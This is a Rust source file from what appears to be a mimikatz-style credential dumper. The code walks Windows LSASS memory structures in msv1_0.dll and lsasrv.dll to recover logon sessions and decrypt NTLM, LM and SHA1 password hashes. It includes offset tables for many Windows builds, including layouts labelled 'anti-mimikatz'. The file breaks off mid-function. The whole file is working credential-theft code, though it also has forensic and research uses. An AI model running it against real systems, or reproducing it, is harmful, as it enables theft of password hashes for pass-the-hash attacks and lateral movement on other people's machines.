use crate::error::{VmkatzError, Result};
use crate::lsass::crypto::{CryptoKeys, PreVistaCryptoKeys};
use crate::lsass::patterns;
use crate::lsass::types::{Arch, MsvCredential, read_ptr, read_ustring, is_valid_user_ptr};
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// MSV1_0 list entry offsets per Windows build variant.
struct MsvOffsets {
    flink: u64,
    luid: u64,
    username: u64,
    domain: u64,
    credentials_ptr: u64,
    // Session metadata offsets (0 = field not available in this variant)
    logon_type: u64,
    session_id: u64,
    logon_time: u64,
    logon_server: u64,
    sid: u64,
    /// true = SID embedded inline, false = SID via pointer
    sid_embedded: bool,
}

/// Session metadata discovered during MSV list walk (returned even when creds are paged).
pub struct MsvSessionInfo {
    pub luid: u64,
    pub username: String,
    pub domain: String,
    pub logon_type: u32,
    pub session_id: u32,
    pub logon_time: u64,
    pub logon_server: String,
    pub sid: String,
}

// Multiple MSV1_0_LIST variants to try (depends on exact Windows build).
// credentials_ptr = 0 means "auto-detect by scanning for Primary signature".
const MSV_OFFSET_VARIANTS: &[MsvOffsets] = &[
    // Variant 0: Empirical NlpActiveLogonTable (Win10 19041+/22H2)
    // Not a KIWI_MSV1_0_LIST — different structure, empirically determined.
    // LogonTime not available in this structure (confirmed by hex dump analysis).
    MsvOffsets {
        flink: 0x00,
        luid: 0x2C,
        username: 0x48,
        domain: 0x58,
        credentials_ptr: 0,
        logon_type: 0x34,
        session_id: 0x38,
        logon_time: 0, // Not stored in NlpActiveLogon
        logon_server: 0x68,
        sid: 0x88,
        sid_embedded: true,
    },
    // Variant 1: LIST_63 (Win10 10240-26099, Win8.1 w/ AM patch)
    MsvOffsets {
        flink: 0x00,
        luid: 0x70,
        username: 0x90,
        domain: 0xA0,
        credentials_ptr: 0x108,
        logon_type: 0xD8,
        session_id: 0xE8,
        logon_time: 0xF0,
        logon_server: 0xF8,
        sid: 0xD0,
        sid_embedded: false,
    },
    // Variant 2: LIST_62 (Win8/8.1 / Server 2012/2012R2, without AM patch)
    MsvOffsets {
        flink: 0x00,
        luid: 0x70,
        username: 0x80,
        domain: 0x90,
        credentials_ptr: 0xF8,
        logon_type: 0xC8,
        session_id: 0xD8,
        logon_time: 0xE0,
        logon_server: 0xE8,
        sid: 0xC0,
        sid_embedded: false,
    },
    // Variant 3: LIST_60 (Win7 / Vista / Server 2008 R2)
    MsvOffsets {
        flink: 0x00,
        luid: 0x70,
        username: 0x80,
        domain: 0x90,
        credentials_ptr: 0xD8,
        logon_type: 0xB8,
        session_id: 0xBC,
        logon_time: 0xC0,
        logon_server: 0xC8,
        sid: 0xB0,
        sid_embedded: false,
    },
    // Variant 4: LIST_61_ANTI_MIMIKATZ (Win7 w/ newer msv1_0.dll, timestamp > 0x53480000)
    MsvOffsets {
        flink: 0x00,
        luid: 0x70,
        username: 0x90,
        domain: 0xA0,
        credentials_ptr: 0xE8,
        logon_type: 0xC8,
        session_id: 0xCC,
        logon_time: 0xD0,
        logon_server: 0xD8,
        sid: 0xC0,
        sid_embedded: false,
    },
    // Variant 5: LIST_64 (Win11 24H2 early builds)
    MsvOffsets {
        flink: 0x00,
        luid: 0x70,
        username: 0x98,
        domain: 0xA8,
        credentials_ptr: 0x110,
        logon_type: 0xE0,
        session_id: 0xF0,
        logon_time: 0xF8,
        logon_server: 0x100,
        sid: 0xD8,
        sid_embedded: false,
    },
    // Variant 6: LIST_65 (Win11 24H2 newer builds)
    MsvOffsets {
        flink: 0x00,
        luid: 0x70,
        username: 0xA0,
        domain: 0xB0,
        credentials_ptr: 0x118,
        logon_type: 0xE8,
        session_id: 0xF8,
        logon_time: 0x100,
        logon_server: 0x108,
        sid: 0xE0,
        sid_embedded: false,
    },
];

/// Primary credential offsets within MSV1_0_PRIMARY_CREDENTIAL.
pub(crate) struct PrimaryCredOffsets {
    pub(crate) lm_hash: usize,
    pub(crate) nt_hash: usize,
    pub(crate) sha1_hash: usize,
}

// MSV1_0_PRIMARY_CREDENTIAL offsets within the decrypted blob.
// Ordered by likelihood — canonical layouts first, empirical fallbacks last.
pub(crate) const PRIMARY_CRED_OFFSET_VARIANTS: &[PrimaryCredOffsets] = &[
    // Win10 1607+ / Win11
    PrimaryCredOffsets { nt_hash: 0x36, lm_hash: 0x46, sha1_hash: 0x56 },
    // Win10 1507/1511
    PrimaryCredOffsets { nt_hash: 0x28, lm_hash: 0x38, sha1_hash: 0x48 },
    // Win7/8/8.1
    PrimaryCredOffsets { nt_hash: 0x20, lm_hash: 0x30, sha1_hash: 0x40 },
    // Win10 1607+ (Credential Guard variant)
    PrimaryCredOffsets { nt_hash: 0x30, lm_hash: 0x40, sha1_hash: 0x50 },
    // Win10 1607+ DPAPI-shifted (ShaOwPassword before NtOwf)
    PrimaryCredOffsets {
        nt_hash: 0x4A,
        lm_hash: 0x5A,
        sha1_hash: 0x36,
    },
    // Variant 5: Empirical — slight alignment variation of variant 4.
    PrimaryCredOffsets {
        nt_hash: 0x4C,
        lm_hash: 0x5C,
        sha1_hash: 0x6C,
    },
    // Variant 6: Win11 24H2+ (credKeyType DWORD removed, hashes shift -4 vs DPAPI layout)
    PrimaryCredOffsets {
        nt_hash: 0x46,
        lm_hash: 0x56,
        sha1_hash: 0x66,
    },
];

/// Build-number-aware variant priority ordering.
/// Returns indices into `MSV_OFFSET_VARIANTS` ordered by likelihood for the given build.
/// Variant indices:
///   0 = NlpActiveLogon (Win10 19041+)
///   1 = LIST_63 (Win10 all, Win8.1 AM)
///   2 = LIST_62 (Win8/8.1)
///   3 = LIST_61 (Win7/Vista)
///   4 = LIST_61_AM (Win7 AM)
///   5 = LIST_64 (Win11 24H2 early)
///   6 = LIST_65 (Win11 24H2 newer)
fn variant_order_for_build(build: u32) -> Vec<usize> {
    match build {
        26100.. => vec![5, 6, 1, 0, 2, 3, 4],  // Win11 24H2+: LIST_64, LIST_65, then LIST_63
        19041.. => vec![0, 1, 2, 3, 4, 5, 6],   // Win10 19041+: NlpActiveLogon, then LIST_63
        10240.. => vec![1, 0, 2, 3, 4, 5, 6],   // Win10 1507-1903: LIST_63 first
        9200..  => vec![2, 1, 3, 4, 0, 5, 6],   // Win8/8.1: LIST_62, then LIST_63 (AM patch)
        7600..  => vec![3, 4, 2, 1, 0, 5, 6],   // Win7/Vista: LIST_61, then LIST_61_AM
        _       => vec![0, 1, 2, 3, 4, 5, 6],   // Unknown
    }
}

/// Variant ordering with arch awareness.
/// x86 has only 3 variants (indices 0-2), x64 delegates to the build-specific ordering.
fn variant_order_for_build_arch(build: u32, arch: Arch) -> Vec<usize> {
    if arch == Arch::X64 {
        return variant_order_for_build(build);
    }
    // MSV_OFFSET_VARIANTS_X86 has 3 entries: 0=LIST_63 (Win10+), 1=LIST_62 (Win8), 2=LIST_61 (Win7)
    match build {
        10240.. => vec![0, 1, 2],
        9200..  => vec![1, 0, 2],
        _       => vec![2, 1, 0],
    }
}

/// Score a variant's extraction quality for a set of sessions.
/// Higher = more likely correct variant. Prevents false positives from variants
/// that find garbled data with unicode-looking strings.
fn score_variant_sessions(sessions: &std::collections::HashMap<u64, MsvSessionInfo>) -> u32 {
    let mut score = 0u32;
    for s in sessions.values() {
        if !s.username.is_empty() {
            score += 10;
        }
        if s.logon_time != 0 {
            score += 5;
        }
        if !s.domain.is_empty() {
            score += 3;
        }
        if !s.sid.is_empty() {
            score += 2;
        }
    }
    score
}

/// Extract MSV1_0 sessions (always) and credentials (when available) from msv1_0.dll.
/// Returns sessions even when credentials are paged out.
/// `build_number` enables build-aware variant prioritization (0 = unknown).
pub fn extract_msv_sessions(
    vmem: &dyn VirtualMemory,
    msv_base: u64,
    msv_size: u32,
    build_number: u32,
    arch: Arch,
) -> Vec<MsvSessionInfo> {
    let pe = match PeHeaders::parse_from_memory(vmem, msv_base) {
        Ok(p) => p,
        Err(_) => return Vec::new(),
    };
    let variants: &[MsvOffsets] = if arch == Arch::X64 { MSV_OFFSET_VARIANTS } else { MSV_OFFSET_VARIANTS_X86 };

    // Pattern scan for LogonSessionList (x64 only — x86 uses .data scan).
    // The pattern resolves both the list base address and the bucket count.
    let (list_base, bucket_count) = if arch == Arch::X64 {
        let text = match pe.find_section(".text") {
            Some(s) => s,
            None => return Vec::new(),
        };
        let text_base = msv_base + text.virtual_address as u64;
        match patterns::find_pattern(
            vmem,
            text_base,
            text.virtual_size,
            patterns::MSV_LOGON_SESSION_PATTERNS,
            "msv_LogonSessionList_sessions",
        ) {
            Ok((pattern_addr, _)) => match find_list_addr_and_count(vmem, pattern_addr) {
                Ok((addr, count)) => (Some(addr), count),
                Err(_) => (None, 0),
            },
            Err(_) => (None, 0),
        }
    } else {
        (None, 0)
    };

    let _ = msv_size;

    // Use HashMap to allow metadata enrichment when a session is re-discovered
    // by a variant with richer metadata (e.g. variant 2 has logon_time, variant 0 doesn't).
    let mut session_map: std::collections::HashMap<u64, MsvSessionInfo> =
        std::collections::HashMap::with_capacity(bucket_count);

    // Build-aware variant ordering
    let variant_order = variant_order_for_build_arch(build_number, arch);
    log::info!(
        "MSV session discovery: build={}, variant order={:?}",
        build_number,
        variant_order
    );

    // Walk all buckets of the pattern-resolved hash table
    if let Some(base) = list_base {
        log::info!(
            "MSV session discovery: list=0x{:x} buckets={}",
            base,
            bucket_count
        );

        // Try top-3 prioritized variants, score each
        let mut best_map: Option<std::collections::HashMap<u64, MsvSessionInfo>> = None;
        let mut best_score = 0u32;
        let mut best_variant_idx = 0;

        let top_n = variant_order.len().min(3);
        for &vi in &variant_order[..top_n] {
            let offsets = &variants[vi];
            let mut trial_map: std::collections::HashMap<u64, MsvSessionInfo> =
                std::collections::HashMap::with_capacity(bucket_count);
            walk_session_buckets(vmem, base, bucket_count, offsets, &mut trial_map, arch);
            let score = score_variant_sessions(&trial_map);
            log::info!(
                "MSV variant {} (luid=0x{:x}): {} sessions, score={}",
                vi, offsets.luid, trial_map.len(), score
            );
            if score > best_score {
                best_score = score;
                best_map = Some(trial_map);
                best_variant_idx = vi;
            }
        }

        // If top-3 all scored 0, try remaining variants
        if best_score == 0 {
            for &vi in &variant_order[top_n..] {
                let offsets = &variants[vi];
                let mut trial_map: std::collections::HashMap<u64, MsvSessionInfo> =
                    std::collections::HashMap::new();
                walk_session_buckets(vmem, base, bucket_count, offsets, &mut trial_map, arch);
                let score = score_variant_sessions(&trial_map);
                if score > best_score {
                    best_score = score;
                    best_map = Some(trial_map);
                    best_variant_idx = vi;
                }
            }
        }

        if let Some(map) = best_map {
            log::info!(
                "MSV sessions: best variant {} (luid=0x{:x}), {} sessions, score={}",
                best_variant_idx,
                variants[best_variant_idx].luid,
                map.len(),
                best_score
            );
            session_map = map;
        }
    }

    // Also try .data scan candidates (single list heads) if pattern didn't find enough
    if session_map.len() < 3 {
        let list_addrs =
            find_all_logon_session_list_candidates(vmem, &pe, msv_base, arch).unwrap_or_default();

        for list_addr in &list_addrs {
            for &vi in &variant_order {
                let offsets = &variants[vi];
                let pre = session_map.len();
                walk_session_list(vmem, *list_addr, offsets, &mut session_map, arch);
                if session_map.len() > pre {
                    break;
                }
            }
        }
    }

    // Phase 2: Enrich session metadata by re-walking ALL tables/lists with ALL variants.
    //
    // Why walk again with ALL variants? The credential extraction phase (above) stops at
    // the first variant that yields credentials. But session metadata (LogonTime, SID,
    // LogonServer) may exist in a DIFFERENT structure or require a different variant:
    //   - Win10 19041+: credentials come from NlpActiveLogon (variant 0, no LogonTime),
    //     but LogonTime lives in a separate LogonSessionList (LIST_63, variant 1).
    //   - The hash table may use one variant while single-list candidates use another.
    // By re-walking everything with every variant, merge_session() fills in any missing
    // metadata fields from whichever variant/structure has them.
    {
        let pre_logon_times: usize = session_map.values().filter(|s| s.logon_time != 0).count();

        // Re-walk the pattern-resolved hash table with ALL variants (not just the winner)
        if let Some(base) = list_base {
            for offsets in variants {
                walk_session_buckets(vmem, base, bucket_count, offsets, &mut session_map, arch);
            }
        }

        // Walk inline hash tables with ALL variants
        if let Ok(tables) = find_inline_hash_table(vmem, &pe, msv_base, arch) {
            for (table_addr, count) in &tables {
                for offsets in variants {
                    walk_session_buckets(vmem, *table_addr, *count, offsets, &mut session_map, arch);
                }
            }
        }

        // Walk .data scan candidates (linked lists) with ALL variants.
        // This covers LogonSessionList heads not found by the hash table scanner.
        let all_candidates =
            find_all_logon_session_list_candidates(vmem, &pe, msv_base, arch).unwrap_or_default();
        for list_addr in &all_candidates {
            for offsets in variants {
                walk_session_list(vmem, *list_addr, offsets, &mut session_map, arch);
            }
        }

        let post_logon_times: usize = session_map.values().filter(|s| s.logon_time != 0).count();
        if post_logon_times > pre_logon_times {
            log::info!(
                "Enrichment: logon_time populated {} → {} sessions",
                pre_logon_times, post_logon_times
            );
        }
    }

    session_map.into_values().collect()
}

/// Enrich existing sessions with metadata from lsasrv.dll's LogonSessionList.
/// On Win10 19041+, msv1_0.dll uses NlpActiveLogon entries (no LogonTime).
/// lsasrv.dll maintains a separate LogonSessionList with LIST_63 entries that
/// contain LogonTime, LogonServer, SID, etc. This function scans lsasrv.dll's
/// .data section for these entries and merges their metadata into sessions.
pub fn enrich_sessions_from_lsasrv(
    vmem: &dyn VirtualMemory,
    lsasrv_base: u64,
    lsasrv_size: u32,
    sessions: &mut [MsvSessionInfo],
    arch: Arch,
) {
    let pe = match PeHeaders::parse_from_memory(vmem, lsasrv_base) {
        Ok(p) => p,
        Err(_) => return,
    };

    // Select LIST_63+ variants for the right architecture
    // x64: luid=0x70, x86: luid=0x3C
    let list63_luid = if arch == Arch::X64 { 0x70u64 } else { 0x3Cu64 };
    let variants_src = if arch == Arch::X64 { MSV_OFFSET_VARIANTS } else { MSV_OFFSET_VARIANTS_X86 };
    let lsasrv_variants: Vec<&MsvOffsets> = variants_src.iter()
        .filter(|o| o.luid == list63_luid)
        .collect();

    let _ = lsasrv_size; // Size used implicitly via PE parse

    // Build a lookup map: LUID → index into sessions slice
    let mut luid_map: std::collections::HashMap<u64, usize> = std::collections::HashMap::new();
    for (i, s) in sessions.iter().enumerate() {
        luid_map.entry(s.luid).or_insert(i);
    }

    // Scan lsasrv .data section for LIST_ENTRY candidates
    let candidates = find_all_logon_session_list_candidates(vmem, &pe, lsasrv_base, arch)
        .unwrap_or_default();

    if candidates.is_empty() {
        return;
    }

    log::info!(
        "lsasrv enrichment: {} .data candidates, {} variants, arch={:?}",
        candidates.len(), lsasrv_variants.len(), arch
    );

    // Walk each candidate with each LIST variant, looking for sessions that match known LUIDs
    let mut enriched = 0usize;
    for list_addr in &candidates {
        for &offsets in &lsasrv_variants {
            let head_flink = match read_ptr(vmem, *list_addr, arch) {
                Ok(f) => f,
                Err(_) => continue,
            };
            if head_flink == 0 || head_flink == *list_addr {
                continue;
            }

            let mut current = head_flink;
            let mut visited = CycleDetector::new();

            for _ in 0..256 {
                if current == *list_addr || visited.contains(current) || current == 0 {
                    break;
                }
                visited.insert(current);

                let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);

                // Only process LUIDs that match known sessions
                if let Some(&idx) = luid_map.get(&luid) {
                    let (logon_type, session_id, logon_time, logon_server, sid) =
                        extract_session_metadata(vmem, current, offsets, arch);

                    let s = &mut sessions[idx];
                    if s.logon_time == 0 && logon_time != 0 {
                        s.logon_time = logon_time;
                        enriched += 1;
                    }
                    if s.logon_type == 0 && logon_type != 0 {
                        s.logon_type = logon_type;
                    }
                    if s.session_id == 0 && session_id != 0 {
                        s.session_id = session_id;
                    }
                    if s.sid.is_empty() && !sid.is_empty() {
                        s.sid = sid;
                    }
                    if s.logon_server.is_empty() && !logon_server.is_empty() {
                        s.logon_server = logon_server;
                    }
                }

                current = match read_ptr(vmem, current + offsets.flink, arch) {
                    Ok(f) => f,
                    Err(_) => break,
                };
            }
        }
    }

    if enriched > 0 {
        log::info!("lsasrv enrichment: populated logon_time for {} sessions", enriched);
    }
}

/// Fixed-capacity cycle detector for linked-list walks.
/// Replaces HashSet<u64> to avoid heap allocation — the max iteration count is
/// bounded at 256, so a stack array is sufficient.
struct CycleDetector {
    addrs: [u64; 256],
    len: usize,
}

impl CycleDetector {
    fn new() -> Self {
        Self {
            addrs: [0; 256],
            len: 0,
        }
    }

    /// Returns `true` if `addr` was already visited.
    fn contains(&self, addr: u64) -> bool {
        self.addrs[..self.len].contains(&addr)
    }

    /// Records `addr` as visited. Caller must ensure at most 256 insertions.
    fn insert(&mut self, addr: u64) {
        debug_assert!(self.len < 256);
        self.addrs[self.len] = addr;
        self.len += 1;
    }
}

/// Walk a hash table (array of LIST_ENTRY buckets) and insert/merge sessions.
fn walk_session_buckets(
    vmem: &dyn VirtualMemory,
    base: u64,
    bucket_count: usize,
    offsets: &MsvOffsets,
    session_map: &mut std::collections::HashMap<u64, MsvSessionInfo>,
    arch: Arch,
) {
    let bucket_size = arch.list_entry_size();
    for bucket_idx in 0..bucket_count {
        let bucket_addr = base + (bucket_idx as u64) * bucket_size;
        let head_flink = match read_ptr(vmem, bucket_addr, arch) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if head_flink == 0 || head_flink == bucket_addr {
            continue;
        }

        let mut current = head_flink;
        let mut visited = CycleDetector::new();

        for _ in 0..256 {
            if current == bucket_addr || visited.contains(current) || current == 0 {
                break;
            }
            visited.insert(current);

            let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
            let username = read_ustring(vmem, current + offsets.username, arch).unwrap_or_default();
            let domain = read_ustring(vmem, current + offsets.domain, arch).unwrap_or_default();

            if is_plausible_luid(luid) && is_plausible_username(&username) {
                let (logon_type, session_id, logon_time, logon_server, sid) =
                    extract_session_metadata(vmem, current, offsets, arch);
                let info = MsvSessionInfo {
                    luid,
                    username,
                    domain,
                    logon_type,
                    session_id,
                    logon_time,
                    logon_server,
                    sid,
                };
                merge_session(session_map, info);
            }

            current = match read_ptr(vmem, current + offsets.flink, arch) {
                Ok(f) => f,
                Err(_) => break,
            };
        }
    }
}

/// Walk a single linked list and insert/merge sessions.
fn walk_session_list(
    vmem: &dyn VirtualMemory,
    list_addr: u64,
    offsets: &MsvOffsets,
    session_map: &mut std::collections::HashMap<u64, MsvSessionInfo>,
    arch: Arch,
) {
    let head_flink = match read_ptr(vmem, list_addr, arch) {
        Ok(f) => f,
        Err(_) => return,
    };
    if head_flink == 0 || head_flink == list_addr {
        return;
    }

    let mut current = head_flink;
    let mut visited = CycleDetector::new();

    for _ in 0..256 {
        if current == list_addr || visited.contains(current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);
        let username = read_ustring(vmem, current + offsets.username, arch).unwrap_or_default();
        let domain = read_ustring(vmem, current + offsets.domain, arch).unwrap_or_default();

        if is_plausible_luid(luid) && is_plausible_username(&username) {
            let (logon_type, session_id, logon_time, logon_server, sid) =
                extract_session_metadata(vmem, current, offsets, arch);
            let info = MsvSessionInfo {
                luid,
                username,
                domain,
                logon_type,
                session_id,
                logon_time,
                logon_server,
                sid,
            };
            merge_session(session_map, info);
        }

        current = match read_ptr(vmem, current + offsets.flink, arch) {
            Ok(f) => f,
            Err(_) => break,
        };
    }
}

/// Validate that a LUID value looks like a real Windows logon session LUID.
/// Windows LUIDs are 64-bit but in practice the high 32 bits are always zero
/// for logon sessions. Well-known LUIDs: SYSTEM=0x3e7, LOCAL_SERVICE=0x3e5,
/// NETWORK_SERVICE=0x3e4, ANONYMOUS=0x3e6. User sessions start at ~0x4000+.
fn is_plausible_luid(luid: u64) -> bool {
    // High 32 bits must be zero for any real logon session LUID
    luid != 0 && (luid >> 32) == 0
}

/// Validate that a session username looks plausible (not garbage memory).
/// Rejects strings with control characters, backslashes (file paths),
/// or private-use/surrogate codepoints.
fn is_plausible_username(name: &str) -> bool {
    if name.is_empty() || name.len() > 256 {
        return false;
    }
    // Reject file paths (e.g. "C:\Windows\system32\kerberos.DLL")
    if name.contains('\\') || name.contains('/') {
        return false;
    }
    // Reject strings with control characters (except space/tab) or null bytes
    if name.chars().any(|c| c < ' ' && c != '\t') {
        return false;
    }
    // Require at least one alphanumeric character (any script: Latin, CJK, Cyrillic, etc.)
    name.chars().any(|c| c.is_alphanumeric() || c == '$' || c == '-')
}

/// Insert or merge a session into the map. When re-discovering a LUID,
/// enrich with richer metadata (prefer non-zero logon_time, non-empty SID, etc.).
fn merge_session(map: &mut std::collections::HashMap<u64, MsvSessionInfo>, new: MsvSessionInfo) {
    match map.entry(new.luid) {
        std::collections::hash_map::Entry::Vacant(e) => {
            e.insert(new);
        }
        std::collections::hash_map::Entry::Occupied(mut e) => {
            let existing = e.get_mut();
            // Enrich: prefer non-zero/non-empty values from the new variant
            if existing.logon_time == 0 && new.logon_time != 0 {
                existing.logon_time = new.logon_time;
            }
            if existing.logon_type == 0 && new.logon_type != 0 {
                existing.logon_type = new.logon_type;
            }
            if existing.session_id == 0 && new.session_id != 0 {
                existing.session_id = new.session_id;
            }
            if existing.sid.is_empty() && !new.sid.is_empty() {
                existing.sid = new.sid;
            }
            if existing.logon_server.is_empty() && !new.logon_server.is_empty() {
                existing.logon_server = new.logon_server;
            }
        }
    }
}

/// Extract session metadata from an MSV list entry using per-variant offsets.
fn extract_session_metadata(
    vmem: &dyn VirtualMemory,
    entry_addr: u64,
    offsets: &MsvOffsets,
    arch: Arch,
) -> (u32, u32, u64, String, String) {
    let logon_type = if offsets.logon_type != 0 {
        vmem.read_virt_u32(entry_addr + offsets.logon_type).unwrap_or(0)
    } else {
        0
    };

    let session_id = if offsets.session_id != 0 {
        vmem.read_virt_u32(entry_addr + offsets.session_id).unwrap_or(0)
    } else {
        0
    };

    let logon_time = if offsets.logon_time != 0 {
        vmem.read_virt_u64(entry_addr + offsets.logon_time).unwrap_or(0)
    } else {
        0
    };

    let logon_server = if offsets.logon_server != 0 {
        read_ustring(vmem, entry_addr + offsets.logon_server, arch)
            .unwrap_or_default()
    } else {
        String::new()
    };

    let sid = if offsets.sid != 0 {
        if offsets.sid_embedded {
            read_sid_embedded(vmem, entry_addr + offsets.sid)
        } else {
            read_sid_string(vmem, entry_addr + offsets.sid, arch)
        }
    } else {
        String::new()
    };

    (logon_type, session_id, logon_time, logon_server, sid)
}

/// Read a SID from a pointer and format as "S-1-5-21-..."
fn read_sid_string(vmem: &dyn VirtualMemory, ptr_addr: u64, arch: Arch) -> String {
    let sid_ptr = match read_ptr(vmem, ptr_addr, arch) {
        Ok(p) if is_valid_user_ptr(p, arch) => p,
        _ => return String::new(),
    };
    read_sid_at(vmem, sid_ptr)
}

/// Read a SID embedded directly in a structure (not via pointer).
fn read_sid_embedded(vmem: &dyn VirtualMemory, sid_addr: u64) -> String {
    read_sid_at(vmem, sid_addr)
}

/// Read and format a SID at a given virtual address.
fn read_sid_at(vmem: &dyn VirtualMemory, addr: u64) -> String {
    let header = match vmem.read_virt_bytes(addr, 8) {
        Ok(h) => h,
        Err(_) => return String::new(),
    };
    let sub_count = header[1] as usize;
    let sub_data = match vmem.read_virt_bytes(addr + 8, sub_count * 4) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    super::types::format_sid_from_bytes(&header, &sub_data)
}

/// Extract MSV1_0 credentials (NTLM hashes) from msv1_0.dll.
/// `build_number` enables build-aware variant prioritization (0 = unknown).
pub fn extract_msv_credentials(
    vmem: &dyn VirtualMemory,
    msv_base: u64,
    _msv_size: u32,
    keys: &CryptoKeys,
    build_number: u32,
    arch: Arch,
) -> Result<Vec<(u64, MsvCredential)>> {
    let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;
    let mut results = Vec::new();
    let variants: &[MsvOffsets] = if arch == Arch::X64 { MSV_OFFSET_VARIANTS } else { MSV_OFFSET_VARIANTS_X86 };

    // Pattern scan for LogonSessionList (x64 only — x86 uses .data scan)
    let list_addrs = if arch == Arch::X64 {
        let text = match pe.find_section(".text") {
            Some(s) => s,
            None => {
                log::info!("No .text section in msv1_0.dll, scanning full image");
                return Ok(results);
            }
        };
        let text_base = msv_base + text.virtual_address as u64;
        log::info!(
            "MSV PE: base=0x{:x}, .text VA=0x{:x}, size=0x{:x}",
            msv_base,
            text.virtual_address,
            text.virtual_size
        );
        match patterns::find_pattern(
            vmem,
            text_base,
            text.virtual_size,
            patterns::MSV_LOGON_SESSION_PATTERNS,
            "msv_LogonSessionList",
        ) {
            Ok((pattern_addr, _)) => {
                vec![find_list_addr(vmem, pattern_addr)?]
            }
            Err(e) => {
                log::info!("Code pattern scan failed (likely paged out): {}", e);
                find_all_logon_session_list_candidates(vmem, &pe, msv_base, arch)?
            }
        }
    } else {
        find_all_logon_session_list_candidates(vmem, &pe, msv_base, arch)?
    };

    if list_addrs.is_empty() {
        return Err(crate::error::VmkatzError::PatternNotFound(
            "LogonSessionList in msv1_0.dll".to_string(),
        ));
    }

    // Build-aware variant ordering for credential extraction
    let cred_variant_order = variant_order_for_build_arch(build_number, arch);

    // Auto-detect the correct (list, offset variant) by trying each combination
    for (li, list_addr) in list_addrs.iter().enumerate() {
        let head_flink = match read_ptr(vmem, *list_addr, arch) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if head_flink == 0 || head_flink == *list_addr {
            continue;
        }

        for &vi in &cred_variant_order {
            let offsets = &variants[vi];
            // Try reading username from the first few entries with this variant
            let mut current = head_flink;
            let mut visited = std::collections::HashSet::new();
            let mut found_username = false;

            for _ in 0..10 {
                if current == *list_addr || visited.contains(&current) || current == 0 {
                    break;
                }
                visited.insert(current);

                let username = read_ustring(vmem, current + offsets.username, arch).unwrap_or_default();
                if !username.is_empty() {
                    found_username = true;
                    break;
                }

                current = match read_ptr(vmem, current + offsets.flink, arch) {
                    Ok(f) => f,
                    Err(_) => break,
                };
            }

            if found_username {
                log::info!(
                    "MSV: Using list candidate {} at 0x{:x} with offset variant {} (LUID=0x{:x}, user=0x{:x}, cred=0x{:x})",
                    li, list_addr, vi, offsets.luid, offsets.username, offsets.credentials_ptr
                );
                results = walk_msv_list(vmem, *list_addr, offsets, keys, arch);
                if !results.is_empty() {
                    return Ok(results);
                }
            }
        }
    }

    // Fallback 2: Search for inline hash table (array of LIST_ENTRY in .data)
    log::info!("MSV: Trying inline hash table scan...");
    if let Ok(tables) = find_inline_hash_table(vmem, &pe, msv_base, arch) {
        for (table_addr, bucket_count) in &tables {
            for offsets in variants {
                if offsets.credentials_ptr == 0 {
                    continue; // Skip empirical NlpActiveLogon variant for hash table
                }
                let r = walk_hash_table(vmem, *table_addr, *bucket_count, offsets, keys, arch);
                if !r.is_empty() {
                    return Ok(r);
                }
            }
            // Also try hash table with auto-detect credentials
            for offsets in variants {
                let r = walk_hash_table(vmem, *table_addr, *bucket_count, offsets, keys, arch);
                if !r.is_empty() {
                    return Ok(r);
                }
            }
        }
    }

    // Fallback 3: try walking each candidate list with each variant
    for list_addr in &list_addrs {
        let head_flink = match read_ptr(vmem, *list_addr, arch) {
            Ok(f) => f,
            Err(_) => continue,
        };
        if head_flink == 0 || head_flink == *list_addr {
            continue;
        }
        for offsets in variants {
            let r = walk_msv_list(vmem, *list_addr, offsets, keys, arch);
            if !r.is_empty() {
                return Ok(r);
            }
        }
    }

    Ok(results)
}

fn walk_msv_list(
    vmem: &dyn VirtualMemory,
    list_addr: u64,
    offsets: &MsvOffsets,
    keys: &CryptoKeys,
    arch: Arch,
) -> Vec<(u64, MsvCredential)> {
    let mut results = Vec::new();
    let mut validated_variant: Option<usize> = None;
    let head_flink = match read_ptr(vmem, list_addr, arch) {
        Ok(f) => f,
        Err(_) => return results,
    };
    if head_flink == 0 || head_flink == list_addr {
        return results;
    }

    let mut current = head_flink;
    let mut visited = std::collections::HashSet::new();

    loop {
        if current == list_addr || visited.contains(&current) || current == 0 {
            break;
        }
        visited.insert(current);

        let luid = match vmem.read_virt_u64(current + offsets.luid) {
            Ok(l) => l,
            Err(_) => break,
        };

        let username = read_ustring(vmem, current + offsets.username, arch).unwrap_or_default();
        let domain = read_ustring(vmem, current + offsets.domain, arch).unwrap_or_default();

        // Get credentials pointer: either from known offset or auto-detect
        let cred_ptr = if offsets.credentials_ptr > 0 {
            let ptr = read_ptr(vmem, current + offsets.credentials_ptr, arch).unwrap_or(0);
            if ptr != 0 && is_valid_user_ptr(ptr, arch) {
                // Verify it's actually a KIWI_MSV1_0_PRIMARY_CREDENTIALS
                if is_primary_credentials_struct(vmem, ptr, arch) {
                    Some(ptr)
                } else {
                    log::debug!(
                        "  cred_ptr at +0x{:x} = 0x{:x} is not Primary credentials, trying scan",
                        offsets.credentials_ptr,
                        ptr
                    );
                    find_credentials_ptr_in_entry(vmem, current, arch)
                }
            } else {
                find_credentials_ptr_in_entry(vmem, current, arch)
            }
        } else {
            // Auto-detect mode: scan entry for KIWI_MSV1_0_PRIMARY_CREDENTIALS
            find_credentials_ptr_in_entry(vmem, current, arch)
        };

        // Walk the PRIMARY_CREDENTIALS linked list to find the "Primary" entry,
        // skipping "CredentialKeys" (DPAPI key material) entries.
        let primary_ptr = cred_ptr.and_then(|p| find_primary_entry_in_chain(vmem, p, arch));

        if let Some(primary_ptr) = primary_ptr {
            if !username.is_empty() {
                if let Ok(cred) =
                    extract_primary_credential(vmem, primary_ptr, keys, &mut validated_variant, arch)
                {
                    log::info!(
                        "MSV credential: LUID=0x{:x} user={} domain={} NT={}",
                        luid,
                        username,
                        domain,
                        hex::encode(cred.nt_hash)
                    );
                    results.push((
                        luid,
                        MsvCredential {
                            username: username.clone(),
                            domain: domain.clone(),
                            lm_hash: cred.lm_hash,
                            nt_hash: cred.nt_hash,
                            sha1_hash: cred.sha1_hash,
                        },
                    ));
                }
            }
        } else if !username.is_empty() {
            log::info!(
                "MSV entry (credentials paged out): LUID=0x{:x} user={} domain={}",
                luid,
                username,
                domain
            );
        }

